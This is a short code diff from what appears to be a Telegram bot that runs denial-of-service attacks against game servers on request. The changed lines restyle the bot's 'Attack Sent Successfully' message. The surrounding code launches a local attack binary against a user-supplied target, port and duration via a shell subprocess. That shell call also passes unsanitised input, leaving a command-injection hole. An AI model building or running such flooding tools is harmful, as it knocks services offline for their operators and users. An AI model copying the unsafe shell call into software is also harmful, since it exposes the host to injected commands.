@@ -260,7 +260,7 @@ def start_attack(user_id, target, port, duration):
     user = bot.get_chat(user_id)
     username = f"@{user.username}" if user.username else f"UserID: {user_id}"
     log_command(user_id, target, port, duration)
-    response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration}\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿 𝗡𝗮𝗺𝗲: {username}"
+    response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n🗿𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n⏳𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration} Second\n🤡𝗡𝗢𝗢𝗕 𝗣𝗟𝗔𝗬𝗘𝗥: {username}\n💣𝗠𝗘𝗧𝗛𝗢𝗗:- @DEVIL_KING_9\n\n🔥𝗦𝘁𝗮𝘁𝘂𝘀: Attack in Progress... 🔥"
     bot.send_message(user_id, response)
     try:
         ongoing_attacks[attack_id] = subprocess.Popen(f"./{bgmi_file} {target} {port} {duration} 200", shell=True)
